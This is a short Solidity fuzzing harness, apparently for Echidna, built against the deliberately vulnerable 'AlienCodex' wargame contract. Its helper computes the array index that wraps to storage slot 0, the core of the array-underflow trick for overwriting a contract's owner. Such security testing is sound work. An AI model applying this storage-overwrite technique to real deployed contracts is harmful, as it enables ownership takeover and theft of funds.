pragma solidity ^0.5.0;

import 'contract.sol';

contract Test is AlienCodex {
  function echidna_test_owner() public returns (bool) {
    return owner() == msg.sender;
  }

  // prime echidna const dictionary
  uint c1 = 0;
  uint c2 = 1;

  function guess_owner(uint slot, uint slotoff) public returns (uint) {
    // See https://solidity.readthedocs.io/en/v0.4.24/miscellaneous.html#layout-of-state-variables-in-storage
    uint slotbase = uint(keccak256(abi.encodePacked(uint(slot))));
    // If array is at `slot`, this makes it so array[zeroslot] == slot 0
    uint zeroslot = uint(-1) - slotbase + 1;
    // Return number so that array[res] == slot `slotoff`
    return zeroslot + slotoff;
  }
}
